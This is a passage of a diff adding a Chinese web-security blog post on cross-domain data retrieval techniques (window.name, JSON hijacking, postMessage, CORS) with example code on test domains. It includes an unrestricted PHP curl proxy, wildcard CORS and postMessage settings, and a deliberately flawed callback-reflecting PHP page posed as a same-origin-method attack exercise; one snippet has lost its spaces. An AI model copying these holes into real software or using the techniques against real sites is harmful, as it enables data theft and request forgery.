class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>主要是利用A站获取数据文件iframe加载B站的data文件，data文件又加载A站的proxy文件，proxy的hash中存有B站的数据，proxy和get文件同源，利用parent.parent两个父页面传递出hash</p>
+<ul>
+<li>通过iframe.name跨域传递数据</li>
+</ul>
+<p>B站的data文件为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">window.name = "I am from B site!!!";</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>A站getB_byname.html的内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Site A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">var state = 0;</div><div class="line">var iframe = document.createElement('iframe');</div><div class="line">iframe.src = 'http://b.test.com/name/data.html';</div><div class="line">var loadfn = function() &#123;</div><div class="line">if (state === 1) &#123;</div><div class="line">var data = iframe.contentWindow.name;</div><div class="line">console.log(data);</div><div class="line">&#125; else if (state === 0) &#123;</div><div class="line">state = 1;</div><div class="line">iframe.contentWindow.location = 'http://a.test.com';</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">iframe.onload = loadfn;</div><div class="line">document.body.appendChild(iframe);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>代码可以变得更简单点：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">stats=0</div><div class="line">var iframe=document.createElement("iframe");</div><div class="line">iframe.onload=function () &#123;</div><div class="line">if(stats===0)&#123;</div><div class="line">stats=1;</div><div class="line">iframe.src="http://a.test.com/";</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">console.log(iframe.contentWindow.name);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">iframe.src="http://b.test.com/name/data.html";</div><div class="line">document.body.appendChild(iframe);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>原理：</p>
+<p>主要就是先iframe 加载数据页面，此时window.name传递给了iframe的name，在利用跳转到同源的页面下，输出数据。</p>
+<ul>
+<li>json劫持</li>
+</ul>
+<p>B站的data数据：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var data="I am from B site!!!"</div></pre></td></tr></table></figure>
+<p>A站的get代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://b.test.com/json/data.html"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">console.log(data);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<ul>
+<li>html5中的postMessage</li>
+</ul>
+<p>B站的data数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">window.onload=function()&#123;</div><div class="line">  parent.postMessage(&apos;I am B data!!&apos;,&apos;*&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>获取数据代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://b.test.com/H5/data.html&quot;&gt;&lt;/iframe&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.addEventListener(&apos;message&apos;,function(e)&#123;</div><div class="line">  alert(e.data);</div><div class="line">&#125;)</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>这个可以参考下呆子不开口的《对方不想说话并扔了个message》</p>
+<ul>
+<li>CORS</li>
+</ul>
+<p>主要就是通过设置相应头中的 Access-Control-Allow-Origin 字段。前面直接用ajax获取数据时候已经提示了。</p>
+<p>Access-Control-Allow-Origin 响应字段说明了该资源或网站所允许被非同源站点访问的站点列表，当 Access-Control-Allow-Origin 中包含网站 A 或者设置为 * 时，网站 A 即可对网站 B 上的资源进行任意访问。</p>
+<p>也就是利用ajax请求可以获取到数据信息的。</p>
+<p>php文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</div><div class="line"></div><div class="line">echo &quot;Site B PHP resource!!&quot;;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>设置 Access-Control-Allow-Origin 允许所有站点访问读取</p>
+<p>get代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">var xml = new XMLHttpRequest();</div><div class="line"></div><div class="line">xml.open(&apos;get&apos;, &apos;http://b.test.com/data.php&apos;, true);</div><div class="line"></div><div class="line">xml.onreadystatechange = function() &#123;</div><div class="line"></div><div class="line">if (xml.readyState == 4 &amp;&amp; xml.status==200) &#123;</div><div class="line"></div><div class="line">console.log(xml.responseText);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">xml.send();</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<ol>
+<li>B站资源不可控</li>
+</ol>
+<p>利用中间代理访问,方法利用php页面去访问数据页面获取到数据，在利用cors传递回来。</p>
+<p>代理代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">'Access-Control-Allow-Origin: *'</span>);</div><div class="line">$method = $_REQUEST[<span class="string">'method'</span>];</div><div class="line">$target = $_REQUEST[<span class="string">'target'</span>];</div><div class="line">$data = $_REQUEST[<span class="string">'data'</span>];</div><div class="line">$curl = curl_init();</div><div class="line">curl_setopt($curl, CURLOPT_URL, $target);</div><div class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> ($method == <span class="string">'post'</span>) &#123;</div><div class="line">curl_setopt($curl, CURLOPT_POST, <span class="number">1</span>);</div><div class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, $data);</div><div class="line">&#125;</div><div class="line">curl_exec($curl);</div><div class="line">curl_close($curl);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>A站直接ajax请求proxy即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">varxhr=newXMLHttpRequest();</div><div class="line"></div><div class="line">varproxyUrl='http://issec.xxxx.com/proxy/proxy.php';</div><div class="line"></div><div class="line">xhr.open('post',proxyUrl,true);</div><div class="line"></div><div class="line">xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');</div><div class="line"></div><div class="line">xhr.send('method=get&amp;target=http://b.test.com/proxy/data.html&amp;data=');</div><div class="line"></div><div class="line">xhr.onreadystatechange=function()&#123;</div><div class="line"></div><div class="line">    if(xhr.readyState==4&amp;xhr.status==200)</div><div class="line"></div><div class="line">        &#123;console.log(xhr.responseText)&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>讨论：</p>
+<p>你还有那些跨域获取数据的方法？</p>
+<p>问题：</p>
+<ol>
+<li><p>这里面代码里面存在哪几个漏洞设置？</p>
+</li>
+<li><p>讨论下same攻击</p>
+</li>
+</ol>
+<p>首先php代码是有缺陷的，不去设置过多，最简单的，页面内容不可控：</p>
+<p>地址为：www.same.com/1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$callback = $_GET[<span class="string">'callback'</span>];</div><div class="line">$callback=preg_replace(<span class="string">"/[')(&lt;&gt;&#123;&#125;]|\]|\[|\/|\\\|\"|\|/"</span>,<span class="string">""</span>,$callback);</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;"</span>.$callback.<span class="string">"()&lt;/script&gt;"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>这里有个html页面，里面就是个点击的按钮，页面内容不可控：</p>
+<p>地址为www.same.com/1.html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"pid"</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">click</span>')&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>怎么实现自己写个站点页面（不能和same同域），让其他人访问这个页面后出现点击事件？分别考虑下1.php限制了referer和不限制referer的情况。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/web安全/跨域获取数据小结/">展开全文 >></a>
         </p>
       
 
@@ -615,10 +778,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">安全测试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">智能硬件</a>
               </li>
              
@@ -628,6 +787,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">软件</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">安全测试</a>
               </li>
             
             <div class="clearfix"></div>
